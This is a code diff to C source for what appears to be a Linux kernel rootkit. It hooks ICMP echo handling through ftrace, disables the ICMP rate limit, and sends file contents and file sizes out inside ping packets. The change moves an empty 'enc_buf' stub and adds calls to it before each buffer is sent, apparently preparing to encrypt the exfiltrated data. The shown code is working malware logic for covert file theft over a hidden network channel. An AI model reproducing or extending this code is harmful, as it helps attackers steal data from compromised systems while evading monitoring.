@@ -1856,6 +1856,11 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 		return real_icmp_echo(skb);
 }
 
+static int enc_buf(char *dst, char *src, int len)
+{
+	return 0;
+}
+
 static void set_seq(struct icmphdr *icmph, unsigned short seq)
 {
 	if (!icmph)
@@ -1968,6 +1973,7 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	while (file_size > 0) {
 		len = file_size > buf_len ? buf_len : file_size;
 
+		enc_buf(data+size, data+size, len);
 		skb_get(skb2);
 		memcpy(cmd+LEN_PREFIX_CMD+l_name+1, data+size, len);
 
@@ -2020,6 +2026,7 @@ static int do_send_file_size(const char *name, struct sk_buff *skb, char *buf, i
 		goto end;
 	//pr_info("name:%s, size:%ld", name, file_size);
 	memcpy(buf, (void*)&file_size, sizeof(file_size));
+	enc_buf(buf, buf, sizeof(file_size));
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	real_icmp_echo(skb);
@@ -2077,11 +2084,6 @@ static int do_file_task(short cmd, void *data)
 
 end:
 	return ret;
-}
-
-static int enc_buf(char *dst, char *src, int len)
-{
-	return 0;
 }
 
 static int do_secret_task(struct sk_buff *skb)
